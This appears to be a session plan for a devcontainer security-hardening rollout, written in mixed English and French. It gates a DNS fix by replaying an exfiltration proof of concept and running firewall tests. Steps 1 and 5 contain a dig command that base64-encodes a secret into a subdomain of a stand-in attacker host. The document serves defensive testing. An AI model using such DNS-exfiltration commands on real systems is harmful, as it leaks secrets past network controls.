# Session 4 — adversarial-validation (gate)

> **Effort** : ~30 min | **Dependencies** : session 3 (delivered) | **Gate** : YES

## Goal

Empirically confirm that session 3's DNS fix **closes gap #9 of the v1
adversarial validation** without re-opening any of the 3 other critères of
the v1 threat model. This session **gates** the v2 rollout — if any
check fails, session 3's claim is invalid and v2 cannot be declared
done.

The fix takes effect at **rebuild time** (the dnsmasq.conf is baked
into the image), so the validation must be run inside a freshly-rebuilt
devcontainer.

## Threat model (carryover from v1)

| # | Critère | v1 status | v2 target |
|---|---|---|---|
| 1 | App-side cannot tamper with firewall config (Claude in `app` container has no write path to baked /etc/devcontainer-firewall/) | ✅ (v1 session 1) | ✅ unchanged |
| 2 | Admin/host owns config — Claude can suggest but not apply | ✅ (v1 sessions 1+2) | ✅ unchanged |
| 3 | Compromised node cannot exfiltrate without rebuild (no runtime injection path) | ⚠️ accepted-with-gap (#9 DNS exfil) | ✅ strict (gap #9 closed) |

## Prompt to paste

`````
Je démarre la session 4 (gate) du rollout `devcontainer-security-hardening-v2`.

Entry point : `/workspace/plans/devcontainer-security-hardening-v2/ROLLOUT.md`
Read also :
- `STATUS.md` (3 / 4 delivered, session 4 = gate)
- `LOG.md §3` (dnsmasq-strict, in vivo tests + diff)
- `EXISTING.md` (DNS architecture post-session-3)
- `../devcontainer-security-hardening/adversarial-report.md` (v1 PoC #9 details)

Goal : valider empiriquement que le gap #9 est fermé et qu'aucune
régression n'a été introduite par session 3. Si tout green, v2 ferme.

Étapes :

1. **Replay PoC #9 (gap closure)** :
   ```
   PAYLOAD=$(echo "secret-$$-$(date +%s)" | base64 | tr -d '=' | tr '+/' '-_')
   dig +noall +comments "${PAYLOAD}.attacker.example.invalid" @127.0.0.53
   ```
   - Attendu : `status: REFUSED`
   - Cross-check : aucune entrée DNS sortante côté logger
     (`/var/log/mitmproxy*.log`) ne doit contenir le payload encodé.
   - Documenter le hash de payload utilisé dans LOG §4.

2. **Critère 3 (strict reading) — runtime injection paths** :
   - Toute tentative de Claude (running as `node`) d'écrire dans
     `/etc/devcontainer-firewall/` doit échouer (EROFS — déjà validé en
     v1 session 6 mais on re-confirme post-rebuild). Probe :
     ```
     touch /etc/devcontainer-firewall/probe-$$ 2>&1   # → Read-only file system
     ```
   - Sudo restreint : `sudo true` doit demander un password (pas de
     passwordless sudo pour `node`). Cf. v1 sudoers.

3. **Critère 1+2 (config tamper resistance)** — pas censé avoir bougé,
   sanity check :
   - `/etc/devcontainer-firewall/dnsmasq.conf` n'a plus de `server=` ligne
   - `/var/run/devcontainer-firewall/dnsmasq-domains.conf` contient
     `server=/claude-bridge/127.0.0.11` (override unconditional)
   - `bash -n /workspace/.devcontainer/init-firewall.sh` ne devrait
     jamais avoir been bypassed à runtime (immuable, baked in
     /usr/local/bin/)

4. **Run la suite test-dns-strict.sh + test-firewall.sh** :
   ```
   bash /workspace/templates/v2/tests/integration/test-dns-strict.sh
   sudo /usr/local/bin/test-firewall.sh   # peut nécessiter sudo si root requis
   ```
   - test-dns-strict.sh : 6 pass / 0 fail / 1 skip (cloud mode normal)
   - test-firewall.sh : zéro nouveau ❌ vs run pré-session-3. Les ℹ️ pour
     claude-bridge et ollama.internal en cloud mode sont expected.

5. **Diff comportemental avec `main`** :
   - `git stash` les changements de session 3 (ou checkout `main`)
   - Rebuild en mode v1 ou observer le baked dnsmasq.conf v1 — confirmer
     présence de `server=127.0.0.11` L16
   - Re-jouer PoC #9 sur v1 : `dig $(base64).attacker.example.invalid
     @127.0.0.53` → attendu `status: NOERROR` ou un IP retournée
     (preuve que le leak EST le baseline v1)
   - Restaurer les changements session 3
   - Inutile si trop coûteux en rebuilds — le diff peut être documenté
     via lecture du diff statique de `dnsmasq.conf` entre main et HEAD.

6. **Vérifier la non-régression côté workflows Claude Code réels** :
   - Pendant session 4, observer les blocks.log pour 5-10 minutes
     d'activité normale (Claude répond à quelques prompts) — ne pas
     créer d'allowlist post-hoc, juste vérifier que rien de légitime
     n'est REFUSED par dnsmasq.
   - Spécifique : pendant ce temps les hits vers
     `bridge.claudeusercontent.com` et `code.claude.com` doivent passer
     (cf. session 2 pre-allowlist, validation runtime que session 3 a
     bien intégré).

Out of scope :
- Modifier les addons mitmproxy / policy.d/ (zero touch)
- Investigation `169.254.169.254` (Azure IMDS hors v2)
- Rollback v2 (s'il échoue, on rouvre session 3 pour debug, pas un
  rollback complet)

DoD at the end of this session :
1. **STATUS.md** : flip session 4 row 📋 → ✅, Delivered counter 3→4, Next
   focus → "v2 ferme — rollout complet". Si critère 3 fail : 🚧 +
   re-ouvrir session 3.
2. **LOG.md** : append `## 4 — adversarial-validation` daté today. Avec
   les outputs verbatim des probes PoC #9 + sanity checks. Documenter le
   diff de comportement sur PoC #9 entre main et HEAD.
3. **EXISTING.md** : section "Threat model carryover" → flip critère 3
   de "✅ closed (session 3 + session 4 gate)" et retirer la mention
   "audit-accepted reading".
4. **Pas de modification de code** dans cette session (validation pure).
   Si une régression est découverte, STOP + re-plan (CLAUDE.md §1) —
   ne PAS folder le fix dans session 4.
5. **Propose a commit** (doc-only, sans code) :
   ```
   docs(security): v2 rollout closed — gap #9 empirically verified via
   adversarial-validation gate
   ```

## Success criteria

Tous doivent être verts pour fermer v2 :

- [ ] PoC #9 dig → `status: REFUSED`
- [ ] Payload encodé absent de tous les logs sortants
- [ ] `test-dns-strict.sh` → 6 pass / 0 fail (skip toléré pour
  claude-bridge sibling en cloud mode)
- [ ] `test-firewall.sh` → zéro nouveau ❌ vs run pré-session-3 (les ℹ️
  cloud mode tolérés)
- [ ] Diff comportemental main vs HEAD documenté
- [ ] Workflow Claude Code normal pendant 5-10 min sans nouveau host
  bloqué

## Failure mode

Si **n'importe quel critère** échoue :
- STOP, ne pas fermer v2
- Re-ouvrir session 3 avec un nouveau spec ciblé sur le check failed
- Le fix vit dans session 3 / 5+ (selon scope), session 4 est rejoué
  une fois la fix mergée

## Carryover hors v2

À tracker hors de ce rollout (le user a flagué pendant session 2) :
- `169.254.169.254` (Azure IMDS) — qui probe ça depuis un devcontainer
  local ?
- Investiguer dans un rollout séparé si nécessaire.
